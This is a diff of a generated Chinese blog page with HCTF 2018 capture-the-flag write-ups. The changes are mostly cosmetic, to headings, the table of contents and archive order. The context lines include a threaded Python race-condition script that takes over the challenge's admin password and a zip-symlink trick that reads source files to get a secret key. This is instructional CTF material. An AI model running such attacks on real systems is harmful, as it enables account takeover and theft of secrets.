@@ -476,7 +476,7 @@ height:50vh;
 <li>成功更改admin的密码</li>
 </ul>
 <p>但是构想是美好的，这里存在问题，即前两步中，如果我们的Session a是登录后的，那么是无法再去登录admin的<img src="/images/2018-11-12-20-39-30.png" alt=""><br>我们会在第一步直接跳转，所以这里需要条件竞争</p>
-<h3 id="条件竞争思路"><a href="#条件竞争思路" class="headerlink" title="条件竞争思路"></a>条件竞争思路</h3><p>那么能不能避开这个check呢？<br>答案是显然的，我们双线并进<br>当我们的一个进程运行到改密码<br><img src="/images/2018-11-12-20-40-48.png" alt=""><br>这里的时候<br>我们的另一个进程正好退出了这个用户，并且来到了登录的这个位置<br><img src="/images/2018-11-12-20-41-42.png" alt=""><br>此时正好session name变为admin，change密码正好更改了管理员密码</p>
+<h4 id="条件竞争思路"><a href="#条件竞争思路" class="headerlink" title="条件竞争思路"></a>条件竞争思路</h4><p>那么能不能避开这个check呢？<br>答案是显然的，我们双线并进<br>当我们的一个进程运行到改密码<br><img src="/images/2018-11-12-20-40-48.png" alt=""><br>这里的时候<br>我们的另一个进程正好退出了这个用户，并且来到了登录的这个位置<br><img src="/images/2018-11-12-20-41-42.png" alt=""><br>此时正好session name变为admin，change密码正好更改了管理员密码</p>
 <h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>这里直接用研友syang@Whitzard的脚本了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
 <h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>拿到题目，读一下cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImV3Z3RyIn0.DskYKw.8F8fj0a4sT0l8sD2-widlj9pN8U</span><br></pre></td></tr></table></figure></p>
 <p>解码<br><img src="/images/2018-11-11-09-38-34.png" alt=""><br>思路很清晰，伪造admin即可<br>然后发现软连接可用来任意文件读取，那么想到读取secret_key<br>读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 1.txt</span><br><span class="line">zip -y 1.zip 1.txt</span><br></pre></td></tr></table></figure></p>
@@ -620,7 +620,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup"><span class="toc-number">1.</span> <span class="toc-text">Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kzone"><span class="toc-number">2.</span> <span class="toc-text">Kzone</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码审计"><span class="toc-number">2.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入"><span class="toc-number">2.3.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#admin"><span class="toc-number">3.</span> <span class="toc-text">admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集-1"><span class="toc-number">3.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#功能分析"><span class="toc-number">3.2.</span> <span class="toc-text">功能分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法一：session伪造"><span class="toc-number">3.3.</span> <span class="toc-text">解法一：session伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#初步探索"><span class="toc-number">3.3.1.</span> <span class="toc-text">初步探索</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法二：Unicode欺骗"><span class="toc-number">3.4.</span> <span class="toc-text">解法二：Unicode欺骗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unicode问题"><span class="toc-number">3.4.2.</span> <span class="toc-text">unicode问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击构造"><span class="toc-number">3.4.3.</span> <span class="toc-text">攻击构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扩展"><span class="toc-number">3.4.4.</span> <span class="toc-text">扩展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法三：条件竞争"><span class="toc-number">3.5.</span> <span class="toc-text">解法三：条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计-2"><span class="toc-number">3.5.1.</span> <span class="toc-text">代码审计</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件竞争思路"><span class="toc-number">3.6.</span> <span class="toc-text">条件竞争思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">3.6.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">4.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-number">5.</span> <span class="toc-text">game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#share-队友完成"><span class="toc-number">6.</span> <span class="toc-text">share(队友完成)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bottle-队友完成"><span class="toc-number">7.</span> <span class="toc-text">bottle(队友完成)</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup"><span class="toc-number">1.</span> <span class="toc-text">Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kzone"><span class="toc-number">2.</span> <span class="toc-text">Kzone</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码审计"><span class="toc-number">2.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入"><span class="toc-number">2.3.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#admin"><span class="toc-number">3.</span> <span class="toc-text">admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集-1"><span class="toc-number">3.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#功能分析"><span class="toc-number">3.2.</span> <span class="toc-text">功能分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法一：session伪造"><span class="toc-number">3.3.</span> <span class="toc-text">解法一：session伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#初步探索"><span class="toc-number">3.3.1.</span> <span class="toc-text">初步探索</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法二：Unicode欺骗"><span class="toc-number">3.4.</span> <span class="toc-text">解法二：Unicode欺骗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unicode问题"><span class="toc-number">3.4.2.</span> <span class="toc-text">unicode问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击构造"><span class="toc-number">3.4.3.</span> <span class="toc-text">攻击构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扩展"><span class="toc-number">3.4.4.</span> <span class="toc-text">扩展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法三：条件竞争"><span class="toc-number">3.5.</span> <span class="toc-text">解法三：条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计-2"><span class="toc-number">3.5.1.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#条件竞争思路"><span class="toc-number">3.5.2.</span> <span class="toc-text">条件竞争思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">3.5.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">4.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-number">5.</span> <span class="toc-text">game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#share-队友完成"><span class="toc-number">6.</span> <span class="toc-text">share(队友完成)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bottle-队友完成"><span class="toc-number">7.</span> <span class="toc-text">bottle(队友完成)</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -633,6 +633,84 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -3688,12 +3766,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
         </li>
     
     
@@ -3742,12 +3820,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计二之手撸DES加解密程序/" >密码学课程设计二之手撸DES加解密程序</a>
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计一之维吉尼亚唯密文破解/" >密码学课程设计一之维吉尼亚唯密文破解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计一之维吉尼亚唯密文破解/" >密码学课程设计一之维吉尼亚唯密文破解</a>
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计二之手撸DES加解密程序/" >密码学课程设计二之手撸DES加解密程序</a>
         </li>
     
     
@@ -4057,22 +4135,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -4107,17 +4185,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
     
-        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
-    
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
+        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
+    
         <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
-    
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
